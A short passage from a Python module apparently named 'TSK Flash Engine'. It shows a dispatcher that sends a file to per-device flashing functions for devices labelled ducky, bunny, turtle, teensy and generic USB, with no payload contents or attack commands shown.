    switch = extra.get("switch", 1)

    if device == "ducky":
        return flash_ducky(path, progress_cb)
    elif device == "bunny":
        return flash_bunny(path, switch=switch, progress_cb=progress_cb)
    elif device == "turtle":
        return flash_turtle(path, progress_cb, cfg=cfg)
    elif device == "teensy":
        return flash_teensy(path, progress_cb, cfg=cfg)
    elif device == "usb":
        deploy = extra.get("usb_deploy", "root")
        mount_path = extra.get("usb_mount_path", "")
        return flash_usb(path, progress_cb, cfg=cfg, deploy=deploy, mount_path=mount_path)
    else:
        log(f"✗ No flash handler for device: {device}", progress_cb)
        return False

if __name__ == "__main__":
    print("TSK Flash Engine - run via server.py or import flash.py")
